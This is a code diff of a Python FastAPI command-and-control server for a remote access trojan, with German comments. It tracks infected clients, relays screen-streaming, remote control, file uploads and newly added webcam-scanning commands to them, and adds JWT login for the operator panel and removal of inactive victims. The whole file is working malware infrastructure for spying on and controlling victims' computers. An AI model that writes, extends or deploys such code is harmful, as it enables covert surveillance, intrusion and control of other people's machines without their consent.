@@ -5,6 +5,7 @@ import os
 import secrets
 import logging
 import websockets
+import time
 
 import uvicorn
 from fastapi import (
@@ -14,15 +15,20 @@ from fastapi import (
     Depends,
     HTTPException,
     status,
+    Request,
 )
-from fastapi.responses import FileResponse
+from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
 from fastapi.security import HTTPBasic, HTTPBasicCredentials
+import jwt
+from datetime import datetime, timedelta
+
 
 # --- Globale Variablen & App-Initialisierung ---
-RAT_CLIENTS = {}
+RAT_CLIENTS = {}  # client_id: websocket
 CLIENT_COUNTER = 1
-WEB_UI_SOCKET: WebSocket | None = None
-CLIENT_INFOS = {}  # <--- NEU: speichert Infos zu jedem Client
+WEB_UI_SOCKETS = set()  # Unterstützt mehrere Web-UIs
+CLIENT_INFOS = {}  # client_id: {hostname, os, ip, last_seen}
+CLIENT_LAST_PING = {}  # client_id: timestamp
 app = FastAPI()
 
 # --- Basic Auth Konfiguration ---
@@ -30,7 +36,14 @@ security = HTTPBasic()
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "supersecretpassword123")
 
+# --- JWT Konfiguration ---
+JWT_SECRET = os.getenv("JWT_SECRET", "ratsecretjwt")
+JWT_ALGO = "HS256"
+JWT_EXP_MINUTES = 120
+
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+
+CLIENT_TIMEOUT = 300  # Sekunden
 
 
 # --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN ---
@@ -50,19 +63,59 @@ async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)
     return credentials.username
 
 
+# --- JWT Funktionen ---
+def create_jwt_token(username: str):
+    payload = {
+        "sub": username,
+        "exp": datetime.utcnow() + timedelta(minutes=JWT_EXP_MINUTES)
+    }
+    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)
+
+def verify_jwt_token(token: str):
+    try:
+        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
+        return payload.get("sub")
+    except Exception:
+        return None
+
+
 # --- Web-UI Endpunkte ---
-@app.get("/", dependencies=[Depends(get_current_user)])
-async def get_index():
+@app.post("/login")
+async def login(request: Request):
+    data = await request.json()
+    username = data.get("username")
+    password = data.get("password")
+    if not username or not password:
+        return JSONResponse({"error": "Benutzername und Passwort erforderlich"}, status_code=400)
+    if (
+        secrets.compare_digest(username, ADMIN_USERNAME)
+        and secrets.compare_digest(password, ADMIN_PASSWORD)
+    ):
+        token = create_jwt_token(username)
+        return {"token": token}
+    return JSONResponse({"error": "Login fehlgeschlagen"}, status_code=401)
+
+@app.get("/", response_class=HTMLResponse)
+async def get_index(request: Request):
+    token = request.query_params.get("token") or request.cookies.get("rat_token")
+    if not token or not verify_jwt_token(token):
+        # Zeige immer index.html, die UI prüft das Login selbst
+        return FileResponse("index.html")
     return FileResponse("index.html")
 
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
-    global WEB_UI_SOCKET
+    # Token aus Query-Parameter prüfen
+    token = websocket.query_params.get("token")
+    if not token or not verify_jwt_token(token):
+        await websocket.close(code=4401)
+        return
     await websocket.accept()
-    WEB_UI_SOCKET = websocket
+    WEB_UI_SOCKETS.add(websocket)
     logging.info("Web-UI verbunden.")
     await send_client_list()
+    last_ping = time.time()
     try:
         while True:
             try:
@@ -72,21 +125,22 @@ async def websocket_endpoint(websocket: WebSocket):
                 await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Timeout, Verbindung geschlossen."})
                 break
             except Exception as e:
-                import websockets
                 if isinstance(e, WebSocketDisconnect) or getattr(e, "code", None) == 1006:
                     logging.warning("[Web-UI] Verbindung wurde abgebrochen (Upload/Disconnect).")
                     await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI Verbindung wurde abgebrochen (Upload/Disconnect)."})
-                    break
-                    logging.error("[Web-UI] Upload zu groß oder WebSocket-Frame zu groß.")
-                    await send_to_web_ui({"type": "error", "message": "Upload zu groß oder Verbindung abgebrochen. Bitte kleinere Datei wählen."})
                     break
                 logging.error(f"[Web-UI] Fehler: {e}")
                 await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Web-UI Fehler: {e}"})
                 break
 
+            # --- Heartbeat/Ping ---
+            if data.get("type") == "ping":
+                last_ping = time.time()
+                await websocket.send_json({"type": "pong"})
+                continue
+
             # --- Chunked Upload Handling ---
             if data.get("action") == "upload_chunk":
-                # Weiterleitung an Client wie bei normalem Upload
                 target_id = data.get("target_id")
                 try:
                     target_id_int = int(target_id)
@@ -108,7 +162,7 @@ async def websocket_endpoint(websocket: WebSocket):
                 continue
 
             # --- Screenstream/Control Weiterleitung ---
-            if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
+            if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control', 'scan_cameras', 'webcam_start', 'webcam_stop'):
                 target = data.get('target_id') or data.get('client_id')
                 try:
                     target_int = int(target)
@@ -174,27 +228,25 @@ async def websocket_endpoint(websocket: WebSocket):
                 await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Senden an Client {target_id_int}: {e}"})
     except WebSocketDisconnect:
         logging.warning("Web-UI hat die Verbindung getrennt.")
-        WEB_UI_SOCKET = None
+        if websocket in WEB_UI_SOCKETS:
+            WEB_UI_SOCKETS.remove(websocket)
         await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Web-UI hat die Verbindung getrennt."})
 
 # --- Hilfsfunktion: Sende aktuelle Client-Liste ---
 async def send_client_list():
     try:
-        await send_to_web_ui(
+        clients = [
             {
-                "type": "client_list",
-                "clients": [
-                    {
-                        "id": str(cid),
-                        "hostname": CLIENT_INFOS.get(cid, {}).get("hostname", f"Client {cid}"),
-                        "address": getattr(ws, 'remote_address', 'unknown'),
-                        "os": CLIENT_INFOS.get(cid, {}).get("os", ""),
-                        "ip": CLIENT_INFOS.get(cid, {}).get("ip", ""),
-                    }
-                    for cid, ws in RAT_CLIENTS.items()
-                ],
+                "id": str(cid),
+                "hostname": CLIENT_INFOS.get(cid, {}).get("hostname", f"Client {cid}"),
+                "address": getattr(ws, 'remote_address', 'unknown'),
+                "os": CLIENT_INFOS.get(cid, {}).get("os", ""),
+                "ip": CLIENT_INFOS.get(cid, {}).get("ip", ""),
+                "last_seen": CLIENT_INFOS.get(cid, {}).get("last_seen", 0),
             }
-        )
+            for cid, ws in RAT_CLIENTS.items()
+        ]
+        await send_to_web_ui({"type": "client_list", "clients": clients})
     except Exception as e:
         logging.error(f"Fehler beim Senden der Client-Liste: {e}")
 
@@ -210,6 +262,7 @@ async def rat_client_endpoint(websocket: WebSocket):
     client_port = websocket.client.port if websocket.client else 0
     remote_address = (client_host, client_port)
     websocket.remote_address = remote_address
+    last_ping = time.time()
     try:
         await websocket.send_json({"action": "systeminfo"})
         sysinfo_data = await asyncio.wait_for(websocket.receive_json(), timeout=5)
@@ -232,6 +285,7 @@ async def rat_client_endpoint(websocket: WebSocket):
         "hostname": hostname,
         "os": os_name,
         "ip": ip,
+        "last_seen": time.time(),
     }
     logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
     await send_to_web_ui(
@@ -251,10 +305,10 @@ async def rat_client_endpoint(websocket: WebSocket):
 
     try:
         screen_meta = None
-        webcam_meta = None
-        screen_meta = None
         while True:
             try:
+                data = await asyncio.wait_for(websocket.receive(), timeout=180)
+            except asyncio.TimeoutError:
                 logging.warning(f"[Client {client_id}] Timeout, Verbindung wird geschlossen.")
                 await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {client_id} Timeout, Verbindung geschlossen."})
                 break
@@ -262,22 +316,12 @@ async def rat_client_endpoint(websocket: WebSocket):
                 logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
                 break
             if data["type"] == "websocket.receive":
-                if "bytes" in data and data["bytes"]:
-                    # Binärdaten: Screenstream-Frame (nicht für Webcam, da base64)
-                    if screen_meta:
-                        await send_to_web_ui({
-                            "action": "screen_frame",
-                            "client_id": str(client_id),
-                            "img_bytes": base64.b64encode(data["bytes"]).decode("ascii"),
-                            "width": screen_meta.get("width"),
-                            "height": screen_meta.get("height"),
-                        })
-                        screen_meta = None
-                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream-Frame von Client {client_id} empfangen."})
-                    continue
-                elif "text" in data and data["text"]:
+                if "text" in data and data["text"]:
                     try:
                         meta = json.loads(data["text"])
+                        if meta.get("type") == "ping":
+                            CLIENT_INFOS[client_id]["last_seen"] = time.time()
+                            continue
                         # Webcam-Stream: Meta-Frame
                         if meta.get("action") == "webcam_frame":
                             # Sende Meta-Frame an Web-UI, dann erwarte base64-Frame als Text
@@ -333,13 +377,41 @@ def extract_ip_from_sysinfo(sysinfo: str) -> str:
 
 # --- Hilfsfunktion ---
 async def send_to_web_ui(data: dict):
-    if WEB_UI_SOCKET:
+    # Sende an alle verbundenen Web-UIs
+    for ws in list(WEB_UI_SOCKETS):
         try:
-            await WEB_UI_SOCKET.send_json(data)
+            await ws.send_json(data)
         except Exception:
-            pass
+            try:
+                WEB_UI_SOCKETS.remove(ws)
+            except Exception:
+                pass
+
+
+# --- Hintergrundtask: Entferne inaktive Clients ---
+async def cleanup_inactive_clients():
+    while True:
+        now = time.time()
+        to_remove = []
+        for cid, info in list(CLIENT_INFOS.items()):
+            if now - info.get("last_seen", now) > CLIENT_TIMEOUT:
+                to_remove.append(cid)
+        for cid in to_remove:
+            logging.warning(f"Entferne inaktiven Client {cid}")
+            if cid in RAT_CLIENTS:
+                try:
+                    await RAT_CLIENTS[cid].close()
+                except Exception:
+                    pass
+                del RAT_CLIENTS[cid]
+            del CLIENT_INFOS[cid]
+            await send_to_web_ui({"type": "client_disconnected", "client_id": str(cid)})
+            await send_client_list()
+        await asyncio.sleep(60)
 
 
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 8000))
+    loop = asyncio.get_event_loop()
+    loop.create_task(cleanup_inactive_clients())
     uvicorn.run(app, host="0.0.0.0", port=port)
